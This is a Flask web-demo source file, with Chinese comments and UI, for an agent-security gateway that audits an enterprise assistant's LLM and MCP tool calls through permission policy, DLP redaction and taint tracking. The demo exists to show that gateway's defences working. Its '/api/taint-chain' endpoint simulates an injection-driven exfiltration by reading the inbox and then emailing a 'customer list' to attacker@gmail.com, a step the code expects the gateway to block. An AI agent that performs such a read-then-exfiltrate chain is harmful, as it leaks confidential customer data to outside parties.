"""
企业智能助手 Web Demo — 带 UI 的可交互系统

运行:  python app.py
打开:  http://127.0.0.1:5001

所有操作走 ASG 全链路:
  前端 -> 后端 -> LLM(8181) / MCP(8181) -> 网关(8080/8090) -> upstream
  网关控制台实时可观测: http://127.0.0.1:8090
"""
from flask import Flask, request, jsonify, render_template_string
import json, time, uuid, os
import urllib.request, urllib.error, urllib.parse

PROBE_MCP = "http://127.0.0.1:8181/mcp"
PROBE_LLM = "http://127.0.0.1:8181/v1/chat/completions"
GW_SESSIONS = "http://127.0.0.1:8090/api/sessions"
GW_TRAJECTORY = "http://127.0.0.1:8090/api/trajectory"

app = Flask(__name__)
SESSION = f"web-demo-{int(time.time())}"

HTML = r"""
<!doctype html><html lang=zh><head><meta charset=utf-8>
<title>企业智能助手 — ASG 全链路 Demo</title>
<style>
:root{--bg:#0d1117;--panel:#161b22;--bd:#30363d;--fg:#e6edf3;--dim:#8b949e;--ok:#3fb950;--bad:#f85149;--warn:#d29922;--accent:#58a6ff}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,"Segoe UI",sans-serif;padding:20px;max-width:1100px;margin:auto}
h1{font-size:20px} .sub{color:var(--dim);margin-bottom:14px}
.grid{display:grid;grid-template-columns:1fr 380px;gap:16px}
.panel{background:var(--panel);border:1px solid var(--bd);border-radius:10px;padding:14px;margin-bottom:14px}
.panel h2{font-size:13px;color:var(--dim);letter-spacing:.04em;margin-bottom:10px;text-transform:uppercase}
.btn{display:inline-block;padding:7px 12px;border-radius:8px;border:1px solid var(--bd);background:#21262d;color:var(--fg);cursor:pointer;margin:4px 6px 4px 0;font-size:13px}
.btn:hover{filter:brightness(1.2)}
.btn.acc{background:#1f6feb;border-color:#1f6feb}
.btn.warn{background:#7a4a00}
.btn.bad{background:#7a1f1f}
.tag{padding:1px 8px;border-radius:10px;font-size:11px;font-weight:700}
.ALLOW{background:#12351c;color:var(--ok)} .BLOCK{background:#3d1418;color:var(--bad)}
.REDACT{background:#3b2e10;color:var(--warn)} .CONFIRM{background:#14304d;color:var(--accent)}
.log{font-family:ui-monospace,Consolas,monospace;font-size:12px;background:#0a0e14;border-radius:8px;padding:10px;max-height:420px;overflow:auto;white-space:pre-wrap}
.ev{border-left:3px solid var(--bd);padding:6px 10px;margin:6px 0;background:#10151d;border-radius:0 6px 6px 0}
.ev.BLOCK{border-color:var(--bad)} .ev.ALLOW{border-color:var(--ok)} .ev.REDACT{border-color:var(--warn)}
a{color:var(--accent)}
input{width:100%;background:#0a0e14;border:1px solid var(--bd);color:var(--fg);border-radius:8px;padding:8px 10px}
</style></head><body>
<h1>🤖 企业智能助手 <span style="font-weight:400;color:var(--dim)">— ASG 全链路可观测 Demo</span></h1>
<div class=sub>所有 LLM / 工具调用经 探针 8181 → 网关 8080 → upstream-mcp &nbsp;|&nbsp; 网关控制台: <a href="http://127.0.0.1:8090" target=_blank>http://127.0.0.1:8090</a> &nbsp;|&nbsp; Session: <code id=sid></code></div>

<div class=grid>
<div>
  <div class=panel>
    <h2>💬 智能问答 (LLM 经探针)</h2>
    <div style="display:flex;gap:8px"><input id=q placeholder="例如：帮我总结一下最新邮件"><button class="btn acc" onclick="ask()">发送</button></div>
    <div id=llmout class=log style="margin-top:10px;min-height:60px;color:var(--dim)">等待输入...</div>
  </div>
  <div class=panel>
    <h2>🧰 工具操作 — 点按钮触发，网关实时判定</h2>
    <div>
      <button class="btn" onclick="tool('get_inbox',{})">📥 读邮件 get_inbox</button>
      <button class="btn" onclick="tool('read_customer_db',{})">👥 读客户库</button>
      <button class="btn warn" onclick="tool('read_secret',{})">🔑 读密钥 read_secret</button>
      <button class="btn bad" onclick="tool('delete_user',{id:123})">⛔ 删用户 delete_user</button>
      <button class="btn bad" onclick="tool('export_all_users',{})">📦 批量导出</button>
      <button class="btn" onclick="tool('send_email',{to:'manager@corp.com',body:'周报正常'})">✉️ 发邮件(可信)</button>
      <button class="btn bad" onclick="taintChain()">🔥 注入攻击链 (get_inbox → attacker)</button>
    </div>
    <div id=toolout class=log style="margin-top:10px;min-height:80px;color:var(--dim)">等待操作...</div>
  </div>
</div>
<div>
  <div class=panel>
    <h2>🛡 网关轨迹 (实时 /api/trajectory)</h2>
    <button class="btn" onclick="loadTraj()">🔄 刷新轨迹</button>
    <a href="http://127.0.0.1:8090" target=_blank class="btn">🌐 打开控制台</a>
    <div id=traj style="margin-top:10px"><div style="color:var(--dim)">点击刷新查看网关判定...</div></div>
    <div id=sug style="margin-top:10px"></div>
  </div>
  <div class=panel>
    <h2>说明</h2>
    <div style="color:var(--dim);font-size:12px;line-height:1.7">
      <b>全链路:</b> 前端→后端→探针(8181)→网关(8080/8090)→upstream-mcp<br>
      <b>三轴:</b> 权限(Cedar) / 数据(Pipelock DLP) / 行为(Taint+Invariant)<br>
      <b>看点:</b> 点“读密钥”看 REDACT 脱敏；点“删用户”看 BLOCK；点“攻击链”看 Taint 拦截<br>
      <b>CLI 版:</b> <code>python agent_demo.py</code> 一键跑全场景
    </div>
  </div>
</div>
</div>
<script>
let SID=""; fetch("/api/session").then(r=>r.json()).then(j=>{SID=j.session;document.getElementById('sid').textContent=SID});
async function ask(){
  const q=document.getElementById('q').value.trim(); if(!q) return;
  document.getElementById('llmout').textContent="请求中... (经 8181 探针 -> 上游)";
  const r=await fetch("/api/ask",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({q})}).then(r=>r.json());
  document.getElementById('llmout').textContent=r.reply||r.error||JSON.stringify(r);
  loadTraj();
}
async function tool(name, args){
  document.getElementById('toolout').textContent=`调用 ${name} ...`;
  const r=await fetch("/api/tool",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({tool:name,args})}).then(r=>r.json());
  document.getElementById('toolout').textContent=JSON.stringify(r,null,2);
  loadTraj();
}
async function taintChain(){
  document.getElementById('toolout').textContent="执行攻击链: get_inbox -> send_email(attacker@gmail.com) ...";
  const r=await fetch("/api/taint-chain",{method:"POST"}).then(r=>r.json());
  document.getElementById('toolout').textContent=JSON.stringify(r,null,2);
  loadTraj();
}
async function loadTraj(){
  const j=await fetch("/api/trajectory").then(r=>r.json());
  const box=document.getElementById('traj'); box.innerHTML="";
  (j.events||[]).slice(-20).forEach(e=>{
    const v=e.Decision.Final, d=document.createElement('div');
    d.className='ev '+v; d.innerHTML=`<span class=tag ${v}>${v}</span> <b>${e.Call.ToolID}</b><div style=color:var(--dim)>${(e.Decision.Rationale||'').slice(0,120)}</div>`;
    box.appendChild(d);
  });
  if(!(j.events||[]).length) box.innerHTML='<div style=color:var(--dim)>暂无事件，先点按钮触发</div>';
  const s=j.suggestion; const sb=document.getElementById('sug');
  if(s){ sb.innerHTML=`<div style=color:var(--dim);font-size:12px;margin-top:8px><b>根因:</b> ${s.root_cause}<div style="margin-top:6px;white-space:pre-wrap;background:#0a0e14;padding:8px;border-radius:6px">${s.cedar_policy||''}</div></div>`; }
  else sb.innerHTML="";
}
setInterval(loadTraj,4000);
</script>
</body></html>
"""

def mcp_call(tool, args, session_id):
    payload = json.dumps({"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":tool,"arguments":args}}).encode()
    req = urllib.request.Request(PROBE_MCP, data=payload, headers={
        "Content-Type":"application/json","Accept":"application/json, text/event-stream","x-asg-session": session_id})
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read().decode()
        for line in body.splitlines():
            if line.startswith("data:"):
                return json.loads(line[5:].strip())
        return {"raw": body}

def llm_call(prompt, session_id):
    payload = json.dumps({"model":"ox-alpha-free","messages":[{"role":"user","content":prompt}],"max_tokens":120}).encode()
    req = urllib.request.Request(PROBE_LLM, data=payload, headers={"Content-Type":"application/json","x-asg-session": session_id})
    with urllib.request.urlopen(req, timeout=60) as r:
        j = json.loads(r.read().decode())
        return j["choices"][0]["message"]["content"]

@app.get("/")
def index(): return render_template_string(HTML)

@app.get("/api/session")
def sess(): return jsonify(session=SESSION)

@app.post("/api/ask")
def ask():
    q = (request.json or {}).get("q","")
    try:
        reply = llm_call(q, SESSION)
        return jsonify(reply=reply)
    except Exception as e:
        return jsonify(error=str(e)), 500

@app.post("/api/tool")
def tool():
    j = request.json or {}
    try:
        r = mcp_call(j.get("tool"), j.get("args") or {}, SESSION)
        return jsonify(r)
    except Exception as e:
        return jsonify(error=str(e)), 500

@app.post("/api/taint-chain")
def taint_chain():
    try:
        a = mcp_call("get_inbox", {}, SESSION)
        b = mcp_call("send_email", {"to":"attacker@gmail.com","body":"customer list"}, SESSION)
        return jsonify(step1=a, step2=b, note="step2 应被网关 BLOCK (taint)")
    except Exception as e:
        return jsonify(error=str(e)), 500

@app.get("/api/trajectory")
def traj():
    url = GW_TRAJECTORY + "?session=" + urllib.parse.quote(SESSION)
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return jsonify(json.loads(r.read().decode()))
    except Exception as e:
        return jsonify(events=[], error=str(e))

if __name__ == "__main__":
    print(f"[*] Web Demo: http://127.0.0.1:5001  (session={SESSION})")
    print(f"[*] 网关控制台: http://127.0.0.1:8090")
    print(f"[*] 全链路: 浏览器 -> Flask(5001) -> 探针8181 -> 网关8080/8090 -> upstream-mcp")
    app.run(host="127.0.0.1", port=5001, debug=False)
